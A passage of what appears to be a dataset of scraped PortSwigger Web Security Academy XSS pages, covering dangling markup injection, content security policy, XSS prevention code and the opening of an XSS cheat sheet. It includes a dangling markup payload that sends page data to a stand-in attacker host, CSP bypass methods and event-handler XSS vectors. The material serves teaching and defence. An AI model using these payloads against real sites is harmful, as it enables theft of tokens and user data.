also occur as a standalone vulnerability. When CSRF occurs as a standalone vulnerability, it can be patched using strategies like anti-CSRF tokens. However, these strategies do not provide any protection if an XSS vulnerability is also present.\n\nLAB\n\nPRACTITIONER [Exploiting XSS to perform CSRF](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)\n\n", "category": "XSS"}, {"title": "Dangling markup injection", "content": "### Cross-site scripting (XSS)\n\n*   [What is XSS?](https://portswigger.net/web-security/cross-site-scripting#what-is-cross-site-scripting-xss)\n*   [How does XSS work?](https://portswigger.net/web-security/cross-site-scripting#how-does-xss-work)\n*   [Impact of an attack](https://portswigger.net/web-security/cross-site-scripting#impact-of-xss-vulnerabilities)\n*   [Proof of concept](https://portswigger.net/web-security/cross-site-scripting#xss-proof-of-concept)\n*   [Testing](https://portswigger.net/web-security/cross-site-scripting#how-to-find-and-test-for-xss-vulnerabilities)\n*    [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)\n    *   [Impact](https://portswigger.net/web-security/cross-site-scripting/reflected#impact-of-reflected-xss-attacks)\n    *   [Contexts](https://portswigger.net/web-security/cross-site-scripting/reflected#reflected-xss-in-different-contexts)\n    *   [Testing](https://portswigger.net/web-security/cross-site-scripting/reflected#how-to-find-and-test-for-reflected-xss-vulnerabilities)\n    *   [FAQs](https://portswigger.net/web-security/cross-site-scripting/reflected#common-questions-about-reflected-cross-site-scripting)\n*    [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)\n    *   [Impact](https://portswigger.net/web-security/cross-site-scripting/stored#impact-of-stored-xss-attacks)\n    *   [Contexts](https://portswigger.net/web-security/cross-site-scripting/stored#stored-xss-in-different-contexts)\n    *   [Testing for vulnerabilities](https://portswigger.net/web-security/cross-site-scripting/stored#how-to-find-and-test-for-stored-xss-vulnerabilities)\n*    [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)\n    *    [Testing](https://portswigger.net/web-security/cross-site-scripting/dom-based#how-to-test-for-dom-based-cross-site-scripting)\n        *   [HTML sinks](https://portswigger.net/web-security/cross-site-scripting/dom-based#testing-html-sinks)\n        *   [JavaScript execution sinks](https://portswigger.net/web-security/cross-site-scripting/dom-based#testing-javascript-execution-sinks)\n        *   [Using DOM Invader](https://portswigger.net/web-security/cross-site-scripting/dom-based#testing-for-dom-xss-using-dom-invader)\n    *    [Exploiting](https://portswigger.net/web-security/cross-site-scripting/dom-based#exploiting-dom-xss-with-different-sources-and-sinks)\n        *    [In third-party dependencies](https://portswigger.net/web-security/cross-site-scripting/dom-based#sources-and-sinks-in-third-party-dependencies)\n            *   [jQuery](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-in-jquery)\n            *   [AngularJS](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-in-angularjs)\n        *   [DOM XSS combined with reflected and stored data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)\n        *   [Sinks](https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities)\n        *   [Preventing](https://portswigger.net/web-security/cross-site-scripting/dom-based#how-to-prevent-dom-xss-vulnerabilities)\n*    [XSS contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)\n    *   [Between HTML tags](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-between-html-tags)\n    *   [In HTML tag attributes](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-html-tag-attributes)\n    *    [JavaScript](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-into-javascript)\n        *   [Terminating the existing script](https://portswigger.net/web-security/cross-site-scripting/contexts#terminating-the-existing-script)\n        *   [Breaking out of a string](https://portswigger.net/web-security/cross-site-scripting/contexts#breaking-out-of-a-javascript-string)\n        *   [Using HTML-encoding](https://portswigger.net/web-security/cross-site-scripting/contexts#making-use-of-html-encoding)\n        *   [Template literals](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-javascript-template-literals)\n    *    [Client-side template injection](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection)\n        *   [AngularJS sandbox](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#what-is-the-angularjs-sandbox)\n        *    [AngularJS sandbox escape](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#how-does-an-angularjs-sandbox-escape-work)\n            *   [Constructing an advanced escape](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#constructing-an-advanced-angularjs-sandbox-escape)\n        *    [AngularJS CSP bypass](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#how-does-an-angularjs-csp-bypass-work)\n            *   [Bypassing a CSP with an AngularJS sandbox escape](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#bypassing-a-csp-with-an-angularjs-sandbox-escape)\n        *   [Preventing](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#how-to-prevent-client-side-template-injection-vulnerabilities)\n*    [Exploiting XSS vulnerabilities](https://portswigger.net/web-security/cross-site-scripting/exploiting)\n    *   [To steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-steal-cookies)\n    *   [To capture passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-capture-passwords)\n    *   [To perform CSRF](https://portswigger.net/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-perform-csrf)\n*    [Dangling markup injection](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)\n    *   [Preventing attacks](https://portswigger.net/web-security/cross-site-scripting/dangling-markup#how-to-prevent-dangling-markup-attacks)\n*    [Content security policy (CSP)](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)\n    *   [Mitigating XSS attacks](https://portswigger.net/web-security/cross-site-scripting/content-security-policy#mitigating-xss-attacks-using-csp)\n    *   [Mitigating dangling markup attacks](https://portswigger.net/web-security/cross-site-scripting/content-security-policy#mitigating-dangling-markup-attacks-using-csp)\n    *   [Bypassing CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy#bypassing-csp-with-policy-injection)\n    *   [Protecting against clickjacking](https://portswigger.net/web-security/cross-site-scripting/content-security-policy#protecting-against-clickjacking-using-csp)\n*    [Preventing XSS attacks](https://portswigger.net/web-security/cross-site-scripting/preventing)\n    *   [Encode data on output](https://portswigger.net/web-security/cross-site-scripting/preventing#encode-data-on-output)\n    *    [Validate input on arrival](https://portswigger.net/web-security/cross-site-scripting/preventing#validate-input-on-arrival)\n        *   [Whitelisting vs blacklisting](https://portswigger.net/web-security/cross-site-scripting/preventing#whitelisting-vs-blacklisting)\n    *   [Allowing \"safe\" HTML](https://portswigger.net/web-security/cross-site-scripting/preventing#allowing-safe-html)\n    *   [Using a template engine](https://portswigger.net/web-security/cross-site-scripting/preventing#how-to-prevent-xss-using-a-template-engine)\n    *   [In PHP](https://portswigger.net/web-security/cross-site-scripting/preventing#how-to-prevent-xss-in-php)\n    *   [In JavaScript](https://portswigger.net/web-security/cross-site-scripting/preventing#how-to-prevent-xss-client-side-in-javascript)\n    *   [In jQuery](https://portswigger.net/web-security/cross-site-scripting/preventing#how-to-prevent-xss-in-jquery)\n    *   [Using CSP](https://portswigger.net/web-security/cross-site-scripting/preventing#mitigating-xss-using-content-security-policy-csp)\n*   [Cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)\n*   [View all XSS labs](https://portswigger.net/web-security/all-labs#cross-site-scripting)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)\n*   [Dangling markup](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)\n\nDangling markup injection\n=========================\n\nIn this section, we'll explain dangling markup injection, how a typical exploit works, and how to prevent dangling markup attacks.\n\nWhat is dangling markup injection?\n----------------------------------\n\nDangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible.\n\nSuppose an application embeds attacker-controllable data into its responses in an unsafe way:\n\n`<input type=\"text\" name=\"input\" value=\"CONTROLLABLE DATA HERE`Suppose also that the application does not filter or escape the `>` or `\"` characters. An attacker can use the following syntax to break out of the quoted attribute value and the enclosing tag, and return to an HTML context:\n\n`\">`In this situation, an attacker would naturally attempt to perform [XSS](https://portswigger.net/web-security/cross-site-scripting). But suppose that a regular XSS attack is not possible, due to input filters, content security policy, or other obstacles. Here, it might still be possible to deliver a dangling markup injection attack using a payload like the following:\n\n`\"><img src='//attacker-website.com?`This payload creates an `img` tag and defines the start of a `src` attribute containing a URL on the attacker's server. Note that the attacker's payload doesn't close the `src` attribute, which is left \"dangling\". When a browser parses the response, it will look ahead until it encounters a single quotation mark to terminate the attribute. Everything up until that character will be treated as being part of the URL and will be sent to the attacker's server within the URL query string. Any non-alphanumeric characters, including newlines, will be URL-encoded.\n\nThe consequence of the attack is that the attacker can capture part of the application's response following the injection point, which might contain sensitive data. Depending on the application's functionality, this might include [CSRF](https://portswigger.net/web-security/csrf) tokens, email messages, or financial data.\n\nAny attribute that makes an external request can be used for dangling markup.\n\nThis next lab is difficult to solve because all external requests are blocked. However, there are certain tags that allow you to store data and retrieve it from an external server later. Solving this lab might require user interaction.\n\nLAB\n\nEXPERT [Reflected XSS protected by very strict CSP, with dangling markup attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)\n\nHow to prevent dangling markup attacks\n--------------------------------------\n\nYou can prevent dangling markup attacks using the same general defenses for [preventing cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/preventing), by encoding data on output and validating input on arrival.\n\nYou can also mitigate some dangling markup attacks using [content security policy](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) ([CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)). For example, you can prevent some (but not all) attacks, using a policy that prevent tags like `img` from loading external resources.\n\n#### Note\n\nThe Chrome browser has decided to tackle dangling markup attacks by preventing tags like `img` from defining URLs containing raw characters such as angle brackets and newlines. This will prevent attacks since the data that would otherwise be captured will generally contain those raw characters, so the attack is blocked.\n\n", "category": "XSS"}, {"title": "Content security policy (CSP)", "content": "### Cross-site scripting (XSS)\n\n*   [What is XSS?](https://portswigger.net/web-security/cross-site-scripting#what-is-cross-site-scripting-xss)\n*   [How does XSS work?](https://portswigger.net/web-security/cross-site-scripting#how-does-xss-work)\n*   [Impact of an attack](https://portswigger.net/web-security/cross-site-scripting#impact-of-xss-vulnerabilities)\n*   [Proof of concept](https://portswigger.net/web-security/cross-site-scripting#xss-proof-of-concept)\n*   [Testing](https://portswigger.net/web-security/cross-site-scripting#how-to-find-and-test-for-xss-vulnerabilities)\n*    [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)\n    *   [Impact](https://portswigger.net/web-security/cross-site-scripting/reflected#impact-of-reflected-xss-attacks)\n    *   [Contexts](https://portswigger.net/web-security/cross-site-scripting/reflected#reflected-xss-in-different-contexts)\n    *   [Testing](https://portswigger.net/web-security/cross-site-scripting/reflected#how-to-find-and-test-for-reflected-xss-vulnerabilities)\n    *   [FAQs](https://portswigger.net/web-security/cross-site-scripting/reflected#common-questions-about-reflected-cross-site-scripting)\n*    [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)\n    *   [Impact](https://portswigger.net/web-security/cross-site-scripting/stored#impact-of-stored-xss-attacks)\n    *   [Contexts](https://portswigger.net/web-security/cross-site-scripting/stored#stored-xss-in-different-contexts)\n    *   [Testing for vulnerabilities](https://portswigger.net/web-security/cross-site-scripting/stored#how-to-find-and-test-for-stored-xss-vulnerabilities)\n*    [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)\n    *    [Testing](https://portswigger.net/web-security/cross-site-scripting/dom-based#how-to-test-for-dom-based-cross-site-scripting)\n        *   [HTML sinks](https://portswigger.net/web-security/cross-site-scripting/dom-based#testing-html-sinks)\n        *   [JavaScript execution sinks](https://portswigger.net/web-security/cross-site-scripting/dom-based#testing-javascript-execution-sinks)\n        *   [Using DOM Invader](https://portswigger.net/web-security/cross-site-scripting/dom-based#testing-for-dom-xss-using-dom-invader)\n    *    [Exploiting](https://portswigger.net/web-security/cross-site-scripting/dom-based#exploiting-dom-xss-with-different-sources-and-sinks)\n        *    [In third-party dependencies](https://portswigger.net/web-security/cross-site-scripting/dom-based#sources-and-sinks-in-third-party-dependencies)\n            *   [jQuery](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-in-jquery)\n            *   [AngularJS](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-in-angularjs)\n        *   [DOM XSS combined with reflected and stored data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)\n        *   [Sinks](https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities)\n        *   [Preventing](https://portswigger.net/web-security/cross-site-scripting/dom-based#how-to-prevent-dom-xss-vulnerabilities)\n*    [XSS contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)\n    *   [Between HTML tags](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-between-html-tags)\n    *   [In HTML tag attributes](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-html-tag-attributes)\n    *    [JavaScript](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-into-javascript)\n        *   [Terminating the existing script](https://portswigger.net/web-security/cross-site-scripting/contexts#terminating-the-existing-script)\n        *   [Breaking out of a string](https://portswigger.net/web-security/cross-site-scripting/contexts#breaking-out-of-a-javascript-string)\n        *   [Using HTML-encoding](https://portswigger.net/web-security/cross-site-scripting/contexts#making-use-of-html-encoding)\n        *   [Template literals](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-javascript-template-literals)\n    *    [Client-side template injection](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection)\n        *   [AngularJS sandbox](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#what-is-the-angularjs-sandbox)\n        *    [AngularJS sandbox escape](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#how-does-an-angularjs-sandbox-escape-work)\n            *   [Constructing an advanced escape](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#constructing-an-advanced-angularjs-sandbox-escape)\n        *    [AngularJS CSP bypass](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#how-does-an-angularjs-csp-bypass-work)\n            *   [Bypassing a CSP with an AngularJS sandbox escape](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#bypassing-a-csp-with-an-angularjs-sandbox-escape)\n        *   [Preventing](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#how-to-prevent-client-side-template-injection-vulnerabilities)\n*    [Exploiting XSS vulnerabilities](https://portswigger.net/web-security/cross-site-scripting/exploiting)\n    *   [To steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-steal-cookies)\n    *   [To capture passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-capture-passwords)\n    *   [To perform CSRF](https://portswigger.net/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-perform-csrf)\n*    [Dangling markup injection](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)\n    *   [Preventing attacks](https://portswigger.net/web-security/cross-site-scripting/dangling-markup#how-to-prevent-dangling-markup-attacks)\n*    [Content security policy (CSP)](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)\n    *   [Mitigating XSS attacks](https://portswigger.net/web-security/cross-site-scripting/content-security-policy#mitigating-xss-attacks-using-csp)\n    *   [Mitigating dangling markup attacks](https://portswigger.net/web-security/cross-site-scripting/content-security-policy#mitigating-dangling-markup-attacks-using-csp)\n    *   [Bypassing CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy#bypassing-csp-with-policy-injection)\n    *   [Protecting against clickjacking](https://portswigger.net/web-security/cross-site-scripting/content-security-policy#protecting-against-clickjacking-using-csp)\n*    [Preventing XSS attacks](https://portswigger.net/web-security/cross-site-scripting/preventing)\n    *   [Encode data on output](https://portswigger.net/web-security/cross-site-scripting/preventing#encode-data-on-output)\n    *    [Validate input on arrival](https://portswigger.net/web-security/cross-site-scripting/preventing#validate-input-on-arrival)\n        *   [Whitelisting vs blacklisting](https://portswigger.net/web-security/cross-site-scripting/preventing#whitelisting-vs-blacklisting)\n    *   [Allowing \"safe\" HTML](https://portswigger.net/web-security/cross-site-scripting/preventing#allowing-safe-html)\n    *   [Using a template engine](https://portswigger.net/web-security/cross-site-scripting/preventing#how-to-prevent-xss-using-a-template-engine)\n    *   [In PHP](https://portswigger.net/web-security/cross-site-scripting/preventing#how-to-prevent-xss-in-php)\n    *   [In JavaScript](https://portswigger.net/web-security/cross-site-scripting/preventing#how-to-prevent-xss-client-side-in-javascript)\n    *   [In jQuery](https://portswigger.net/web-security/cross-site-scripting/preventing#how-to-prevent-xss-in-jquery)\n    *   [Using CSP](https://portswigger.net/web-security/cross-site-scripting/preventing#mitigating-xss-using-content-security-policy-csp)\n*   [Cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)\n*   [View all XSS labs](https://portswigger.net/web-security/all-labs#cross-site-scripting)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)\n*   [CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)\n\nContent security policy\n=======================\n\nIn this section, we'll explain what content security policy is, and describe how CSP can be used to mitigate against some common attacks.\n\nWhat is CSP (content security policy)?\n--------------------------------------\n\nCSP is a browser security mechanism that aims to mitigate [XSS](https://portswigger.net/web-security/cross-site-scripting) and some other attacks. It works by restricting the resources (such as scripts and images) that a page can load and restricting whether a page can be framed by other pages.\n\nTo enable CSP, a response needs to include an HTTP response header called `Content-Security-Policy` with a value containing the policy. The policy itself consists of one or more directives, separated by semicolons.\n\nMitigating XSS attacks using CSP\n--------------------------------\n\nThe following directive will only allow scripts to be loaded from the [same origin](https://portswigger.net/web-security/cors/same-origin-policy) as the page itself:\n\n`script-src 'self'`The following directive will only allow scripts to be loaded from a specific domain:\n\n`script-src https://scripts.normal-website.com`Care should be taken when allowing scripts from external domains. If there is any way for an attacker to control content that is served from the external domain, then they might be able to deliver an attack. For example, content delivery networks (CDNs) that do not use per-customer URLs, such as `ajax.googleapis.com`, should not be trusted, because third parties can get content onto their domains.\n\nIn addition to whitelisting specific domains, content security policy also provides two other ways of specifying trusted resources: nonces and hashes:\n\n*   The CSP directive can specify a nonce (a random value) and the same value must be used in the tag that loads a script. If the values do not match, then the script will not execute. To be effective as a control, the nonce must be securely generated on each page load and not be guessable by an attacker.\n*   The CSP directive can specify a hash of the contents of the trusted script. If the hash of the actual script does not match the value specified in the directive, then the script will not execute. If the content of the script ever changes, then you will of course need to update the hash value that is specified in the directive.\n\nIt's quite common for a CSP to block resources like `script`. However, many CSPs do allow image requests. This means you can often use `img` elements to make requests to external servers in order to disclose [CSRF](https://portswigger.net/web-security/csrf) tokens, for example.\n\nSome browsers, such as Chrome, have built-in [dangling markup](https://portswigger.net/web-security/cross-site-scripting/dangling-markup) mitigation that will block requests containing certain characters, such as raw, unencoded new lines or angle brackets.\n\nSome policies are more restrictive and prevent all forms of external requests. However, it's still possible to [get round these restrictions by eliciting some user interaction](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup). To bypass this form of policy, you need to inject an HTML element that, when clicked, will store and send everything enclosed by the injected element to an external server.\n\nLAB\n\nEXPERT [Reflected XSS protected by very strict CSP, with dangling markup attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)\n\nMitigating dangling markup attacks using CSP\n--------------------------------------------\n\nThe following directive will only allow images to be loaded from the same origin as the page itself:\n\n`img-src 'self'`The following directive will only allow images to be loaded from a specific domain:\n\n`img-src https://images.normal-website.com`Note that these policies will prevent some dangling markup exploits, because an easy way to capture data with no user interaction is using an `img` tag. However, it will not prevent other exploits, such as those that inject an anchor tag with a dangling `href` attribute.\n\nBypassing CSP with policy injection\n-----------------------------------\n\nYou may encounter a website that reflects input into the actual policy, most likely in a `report-uri` directive. If the site reflects a parameter that you can control, you can inject a semicolon to add your own CSP directives. Usually, this `report-uri` directive is the final one in the list. This means you will need to overwrite existing directives in order to exploit this vulnerability and bypass the policy.\n\nNormally, it's not possible to overwrite an existing `script-src` directive. However, Chrome recently introduced the `script-src-elem` directive, which allows you to control `script` elements, but not events. Crucially, this new directive allows you to [overwrite existing `script-src` directives](https://portswigger.net/research/bypassing-csp-with-policy-injection). Using this knowledge, you should be able to solve the following lab.\n\nLAB\n\nEXPERT [Reflected XSS protected by CSP, with CSP bypass](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass)\n\nProtecting against clickjacking using CSP\n-----------------------------------------\n\nThe following directive will only allow the page to be framed by other pages from the same origin:\n\n`frame-ancestors 'self'`The following directive will prevent framing altogether:\n\n`frame-ancestors 'none'`Using content security policy to prevent [clickjacking](https://portswigger.net/web-security/clickjacking) is more flexible than using the X-Frame-Options header because you can specify multiple domains and use wildcards. For example:\n\n`frame-ancestors 'self' https://normal-website.com https://*.robust-website.com`CSP also validates each frame in the parent frame hierarchy, whereas `X-Frame-Options` only validates the top-level frame.\n\nUsing CSP to protect against clickjacking attacks is recommended. You can also combine this with the `X-Frame-Options` header to provide protection on older browsers that don't support CSP, such as Internet Explorer.\n\n", "category": "XSS"}, {"title": "Preventing XSS attacks", "content": "### Whitelisting vs blacklisting\n\nInput validation should generally employ whitelists rather than blacklists. For example, instead of trying to make a list of all harmful protocols (`javascript`, `data`, etc.), simply make a list of safe protocols (HTTP, HTTPS) and disallow anything not on the list. This will ensure your defense doesn't break when new harmful protocols appear and make it less susceptible to attacks that seek to obfuscate invalid values to evade a blacklist.\n\nAllowing \"safe\" HTML\n--------------------\n\nAllowing users to post HTML markup should be avoided wherever possible, but sometimes it's a business requirement. For example, a blog site might allow comments to be posted containing some limited HTML markup.\n\nThe classic approach is to try to filter out potentially harmful tags and JavaScript. You can try to implement this using a whitelist of safe tags and attributes, but thanks to discrepancies in browser parsing engines and quirks like mutation XSS, this approach is extremely difficult to implement securely.\n\nThe least bad option is to use a JavaScript library that performs filtering and encoding in the user's browser, such as DOMPurify. Other libraries allow users to provide content in markdown format and convert the markdown into HTML. Unfortunately, all these libraries have XSS vulnerabilities from time to time, so this is not a perfect solution. If you do use one you should monitor closely for security updates.\n\n#### Note\n\nIn addition to JavaScript, other content such as CSS and even regular HTML can be harmful in some situations.\n\n[Attacks using malicious CSS](https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities#badcss)\n\nHow to prevent XSS using a template engine\n------------------------------------------\n\nMany modern websites use server-side template engines such as Twig and Freemarker to embed dynamic content in HTML. These typically define their own escaping system. For example, in Twig, you can use the `e()` filter, with an argument defining the context:\n\n`{{ user.firstname | e('html') }}`\n\nSome other template engines, such as Jinja and React, escape dynamic content by default which effectively prevents most occurrences of XSS.\n\nWe recommend reviewing escaping features closely when you evaluate whether to use a given template engine or framework.\n\n#### Note\n\nIf you directly concatenate user input into template strings, you will be vulnerable to [server-side template injection](https://portswigger.net/kb/issues/00101080_server-side-template-injection) which is often more serious than XSS.\n\nHow to prevent XSS in PHP\n-------------------------\n\nIn PHP there is a built-in function to encode entities called `htmlentities`. You should call this function to escape your input when inside an HTML context. The function should be called with three arguments:\n\n*   Your input string.\n*   `ENT_QUOTES`, which is a flag that specifies all quotes should be encoded.\n*   The character set, which in most cases should be UTF-8.\n\nFor example:\n\n`<?php echo htmlentities($input, ENT_QUOTES, 'UTF-8');?>`\n\nWhen in a JavaScript string context, you need to Unicode-escape input as already described. Unfortunately, PHP doesn't provide an API to Unicode-escape a string. Here is some code to do that in PHP:\n\n`<?php````\nfunction jsEscape($str) {\n    $output = '';\n    $str = str_split($str);\n    for($i=0;$i<count($str);$i++) {\n        $chrNum = ord($str[$i]);\n        $chr = $str[$i];\n        if($chrNum === 226) {\n            if(isset($str[$i+1]) && ord($str[$i+1]) === 128) {\n                if(isset($str[$i+2]) && ord($str[$i+2]) === 168) {\n                    $output .= '\\u2028';\n                    $i += 2;\n                    continue;\n                }\n                if(isset($str[$i+2]) && ord($str[$i+2]) === 169) {\n                    $output .= '\\u2029';\n                    $i += 2;\n                    continue;\n                }\n            }\n        }\n        switch($chr) {\n            case \"'\":\n            case '\"':\n            case \"\\n\";\n            case \"\\r\";\n            case \"&\";\n            case \"\\\\\";\n            case \"<\":\n            case \">\":\n                $output .= sprintf(\"\\\\u%04x\", $chrNum);\n            break;\n            default:\n                $output .= $str[$i];\n            break;\n    }\n    }\n    return $output;\n}\n?>\n```\n\nHere is how to use the `jsEscape` function in PHP:\n\n`<script>x = '<?php echo jsEscape($_GET['x'])?>';</script>`\n\nAlternatively, you could use a template engine.\n\nHow to prevent XSS client-side in JavaScript\n--------------------------------------------\n\nTo escape user input in an HTML context in JavaScript, you need your own HTML encoder because JavaScript doesn't provide an API to encode HTML. Here is some example JavaScript code that converts a string to HTML entities:\n\n```\nfunction htmlEncode(str){\n    return String(str).replace(/[^\\w. ]/gi, function(c){\n        return '&#'+c.charCodeAt(0)+';';\n    });\n}\n```\n\nYou would then use this function as follows:\n\n`<script>document.body.innerHTML = htmlEncode(untrustedValue)</script>`\n\nIf your input is inside a JavaScript string, you need an encoder that performs Unicode escaping. Here is a sample Unicode-encoder:\n\n```\nfunction jsEscape(str){\n    return String(str).replace(/[^\\w. ]/gi, function(c){\n        return '\\\\u'+('0000'+c.charCodeAt(0).toString(16)).slice(-4);\n    });\n}\n```\n\nYou would then use this function as follows:\n\n`<script>document.write('<script>x=\"'+jsEscape(untrustedValue)+'\";<\\/script>')</script>`\n\nHow to prevent XSS in jQuery\n----------------------------\n\nThe most common form of XSS in jQuery is when you pass user input to a jQuery selector. Web developers would often use `location.hash` and pass it to the selector which would cause XSS as jQuery would render the HTML. jQuery recognized this issue and patched their selector logic to check if input begins with a hash. Now jQuery will only render HTML if the first character is a `<`. If you pass untrusted data to the jQuery selector, ensure you correctly escape the value using the `jsEscape` function above.\n\nMitigating XSS using content security policy (CSP)\n--------------------------------------------------\n\n[Content security policy](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) (CSP) is the last line of defense against cross-site scripting. If your XSS prevention fails, you can use CSP to mitigate XSS by restricting what an attacker can do.\n\nCSP lets you control various things, such as whether external scripts can be loaded and whether inline scripts will be executed. To deploy CSP you need to include an HTTP response header called `Content-Security-Policy` with a value containing your policy.\n\nAn example CSP is as follows:\n\n`default-src 'self'; script-src 'self'; object-src 'none'; frame-src 'none'; base-uri 'none';`\n\nThis policy specifies that resources such as images and scripts can only be loaded from the same origin as the main page. So even if an attacker can successfully inject an XSS payload they can only load resources from the current origin. This greatly reduces the chance that an attacker can exploit the XSS vulnerability.\n\nIf you require loading of external resources, ensure you only allow scripts that do not aid an attacker to exploit your site. For example, if you whitelist certain domains then an attacker can load any script from those domains. Where possible, try to host resources on your own domain.\n\nIf that is not possible then you can use hash- or nonce-based policy to allow scripts on different domains. A nonce is a random string that is added as an attribute of a script or resource, which will only be executed if the random string matches the server-generated one. An attacker is unable to guess the randomized string and therefore cannot invoke a script or resource with a valid nonce and so the resource will not be executed.\n", "category": "XSS"}, {"title": "Cheat sheet", "content": "### Event handlers that do not require user interaction\n\nEvent:\n\nDescription:\n\nTag:\n\nCode:\n\nCopy:\n\nonafterscriptexecute\n\nFires after script is executed\n\n [`<xss onafterscriptexecute=alert(1)><script>1</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onafterscriptexecute%3Dalert%281%29%3E%3Cscript%3E1%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onafterscriptexecute)\n\nCompatibility:\n\n![Does not work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does not work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonanimationcancel\n\nFires when a CSS animation cancels\n\n [`<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style=\"position:absolute;\" onanimationcancel=\"print()\"></xss>`](http://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Ciframe%20onload%3D%22var%20that%3Dthis%3BsetTimeout%28function%28%29%7Bthat.src%3Dthat.src.replace%28%27%23%27%2C%27%23x%27%29%7D%2C500%29%3BsetTimeout%28x%3D%3Ethat.src%3Dthat.src.replace%28%27%23x%27%2C%27%23%27%29%2C1000%29%3B%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cstyle%3E%40keyframes%20x%7Bfrom%20%7Bleft%3A0%3B%7Dto%20%7Bleft%3A%201000px%3B%7D%7D%3Atarget%20%7Banimation%3A10s%20ease-in-out%200s%201%20x%3B%7D%3C%2Fstyle%3E%3Cxss%20id%3Dx%20style%3Dposition%3Aabsolute%3B%20onanimationcancel%3Dprint%28%29%3Etest%3C%2Fxss%3E%23%22%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onanimationcancel)\n\nCompatibility:\n\n![Does not work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in 